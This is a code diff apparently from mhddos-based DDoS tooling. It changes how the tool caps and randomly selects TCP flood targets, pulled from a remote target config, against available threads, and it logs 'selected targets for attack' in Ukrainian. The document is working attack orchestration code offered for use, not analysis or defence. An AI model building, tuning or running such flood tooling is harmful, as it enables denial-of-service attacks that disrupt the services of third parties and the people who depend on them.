@@ -12,8 +12,10 @@ from typing import List, Set, Union
 
 from src.cli import init_argparse
 from src.core import (
-    FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS, IT_ARMY_CONFIG_URL, ONLY_MY_IP, REFRESH_OVERTIME,
-    REFRESH_RATE, SCHEDULER_MIN_INIT_FRACTION, cl, logger
+    FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS,
+    IT_ARMY_CONFIG_URL, ONLY_MY_IP, REFRESH_OVERTIME,
+    REFRESH_RATE, SCHEDULER_MAX_INIT_FRACTION, SCHEDULER_MIN_INIT_FRACTION,
+    cl, logger
 )
 from src.mhddos import AsyncTcpFlood, AsyncUdpFlood, AttackSettings, main as mhddos_main
 from src.output import print_banner, print_progress, show_statistic
@@ -199,18 +201,18 @@ async def run_ddos(
             num_flooders = len(tcp_flooders)
             adjusted_capacity = initial_capacity
             num_init = adjusted_capacity * num_flooders
+            num_allowed_flooders = int(total_threads * SCHEDULER_MAX_INIT_FRACTION)
+            if num_allowed_flooders == 0:
+                # presumably this is not going to happen
+                raise RuntimeError("Capacity initialization error")
 
-            if num_init > total_threads:
-                num_allowed = total_threads // adjusted_capacity
-                if num_allowed == 0:
-                    # presumably this is going to be an extreme use case
-                    raise RuntimeError("Capacity initialization error")
-                # we need free capacity to be able to scale-up for working targets
-                adjusted_capacity, force_install = 1, True
-                random.shuffle(tcp_flooders)
-                tcp_flooders = tcp_flooders[:num_allowed]
-                num_flooders = len(tcp_flooders)
-                logger.info(f"{cl.MAGENTA}Обрано {num_flooders} цілей для атаки{cl.RESET}")
+            if num_init > num_allowed_flooders:
+                adjusted_capacity = 1
+                if num_flooders > num_allowed_flooders:
+                    random.shuffle(tcp_flooders)
+                    tcp_flooders = tcp_flooders[:num_allowed_flooders]
+                    num_flooders = len(tcp_flooders)
+                    logger.info(f"{cl.MAGENTA}Обрано {num_flooders} цілей для атаки{cl.RESET}")
 
             # adjust settings to avoid situation when we have just a few
             # targets in the config (in this case with default CLI settings you are
